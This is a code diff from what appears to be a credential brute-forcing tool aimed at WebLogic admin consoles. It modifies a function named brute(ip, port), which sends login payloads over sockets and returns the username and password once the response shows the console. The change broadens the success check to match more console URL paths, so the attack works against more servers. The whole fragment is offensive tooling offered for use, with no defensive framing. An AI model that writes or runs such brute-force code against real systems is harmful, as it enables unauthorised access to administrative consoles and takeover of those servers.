@@ -41,7 +41,7 @@ def brute(ip,port):
                 except socket.error as e:
                     break
             client1.close()
-            if '''href="http://{}:{}/console">'''.format(ip,port) in buf1:
+            if '''href="http://{}:{}/console">'''.format(ip,port) in buf1 or '''href="http://{}:{}/console/console.portal'''.format(ip,port)  in buf1 or '''href="http://{}:{}/console/index.jsp'''.format(ip,port) in buf1:
                 username = ''.join(re.findall(r'j_username=(.*?)&j_pass',payload()[i],re.I))
                 password = ''.join(re.findall(r'j_password=(.*?)&j_char',payload()[i],re.I))
                 return username,password
@@ -64,7 +64,7 @@ def brute(ip,port):
                 except socket.error as e:
                     break
             client2.close()  
-            if '''href="http://{}:{}/console">'''.format(ip,port) in buf1:
+            if '''href="http://{}:{}/console">'''.format(ip,port) in buf1 or '''href="http://{}:{}/console/console.portal'''.format(ip,port)  in buf1 or '''href="http://{}:{}/console/index.jsp'''.format(ip,port) in buf1:
                 username = ''.join(re.findall(r'j_username=(.*?)&j_pass',payload()[i],re.I))
                 password = ''.join(re.findall(r'j_password=(.*?)&j_char',payload()[i],re.I))
                 return username,password
